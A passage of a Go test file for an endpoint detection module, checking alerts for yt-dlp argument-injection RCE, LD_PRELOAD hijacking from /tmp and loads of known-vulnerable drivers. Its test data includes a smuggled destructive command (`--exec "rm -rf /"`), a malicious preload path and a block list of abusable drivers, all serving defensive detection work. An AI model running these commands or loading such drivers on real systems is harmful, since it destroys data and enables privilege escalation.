	ev.Details["command_line"] = `yt-dlp --exec "rm -rf /" https://youtube.com/watch?v=abc`
	ev.Details["parent_process"] = "bash"
	w.HandleEvent(ev)
	time.Sleep(10 * time.Millisecond)

	if cp.count() == 0 {
		t.Error("expected alert for yt-dlp --exec RCE")
	}
}

func TestYtdlpRCE_SafeUsageNoAlert(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)

	ev := core.NewSecurityEvent("test", "process_start", core.SeverityInfo, "yt-dlp process")
	ev.Details["process_name"] = "yt-dlp"
	ev.Details["command_line"] = `yt-dlp -f best https://youtube.com/watch?v=abc`
	ev.Details["parent_process"] = "bash"
	w.HandleEvent(ev)
	time.Sleep(10 * time.Millisecond)

	titles := cp.alertTitles()
	for _, title := range titles {
		if title == "yt-dlp Argument-Based RCE Detected (CVE-2026-26331)" {
			t.Error("should not alert for safe yt-dlp usage")
		}
	}
}

// ─── Library Load Path Hijacking ──────────────────────────────────────────────

func TestLibraryPathHijack_LDPreload(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)

	ev := core.NewSecurityEvent("test", "process_start", core.SeverityInfo, "malicious process")
	ev.Details["process_name"] = "bash"
	ev.Details["command_line"] = `LD_PRELOAD=/tmp/malicious.so /usr/bin/target`
	ev.Details["parent_process"] = "cron"
	w.HandleEvent(ev)
	time.Sleep(10 * time.Millisecond)

	if cp.count() == 0 {
		t.Error("expected alert for LD_PRELOAD from /tmp")
	}
}

func TestLibraryPathHijack_SafeSystemPath(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)

	ev := core.NewSecurityEvent("test", "process_start", core.SeverityInfo, "safe process")
	ev.Details["process_name"] = "app"
	ev.Details["command_line"] = `LD_PRELOAD=/usr/lib/libcustom.so /usr/bin/app`
	ev.Details["parent_process"] = "systemd"
	w.HandleEvent(ev)
	time.Sleep(10 * time.Millisecond)

	titles := cp.alertTitles()
	for _, title := range titles {
		if title == "Library Load Path Hijacking Detected" {
			t.Error("should not alert for LD_PRELOAD from /usr/lib")
		}
	}
}

// ─── BYOVD Driver Load Detection ────────────────────────────────────────────

func TestHandleDriverLoad_BlockedDriver(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)

	for _, driver := range []string{"rtcore64.sys", "procexp152.sys", "huaweidriver.sys", "gdrv.sys", "nal.sys", "qmudisk64.sys"} {
		cp.mu.Lock()
		cp.alerts = nil
		cp.mu.Unlock()

		ev := core.NewSecurityEvent("test", "driver_load", core.SeverityInfo, "driver load")
		ev.Details["driver_name"] = driver
		ev.Details["process_name"] = "malware.exe"
		ev.Details["path"] = `C:\Windows\System32\drivers\` + driver
		w.HandleEvent(ev)
		time.Sleep(10 * time.Millisecond)

		if !cp.hasAlertType("byovd_driver_load") {
			t.Errorf("expected BYOVD alert for driver %q, got none", driver)
		}
	}
}

func TestHandleDriverLoad_SafeDriver(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)

	ev := core.NewSecurityEvent("test", "driver_load", core.SeverityInfo, "driver load")
	ev.Details["driver_name"] = "ntfs.sys"
	ev.Details["process_name"] = "windows"
	w.HandleEvent(ev)
	time.Sleep(10 * time.Millisecond)

	if cp.hasAlertType("byovd_driver_load") {
		t.Error("should NOT alert for legitimate driver ntfs.sys")
	}
}

func TestHandleDriverLoad_PathExtraction(t *testing.T) {
	cp := makeCapturingPipeline()
	w := startedModuleWithPipeline(t, cp)

	ev := core.NewSecurityEvent("test", "driver_load", core.SeverityInfo, "driver load")
	ev.Details["path"] = `/tmp/exploit/mhyprot2.sys`
	ev.Details["process_name"] = "loader"
	w.HandleEvent(ev)
	time.Sleep(10 * time.Millisecond)

	if !cp.hasAlertType("byovd_driver_load") {
		t.Error("expected BYOVD alert when driver name extracted from path")
	}
}
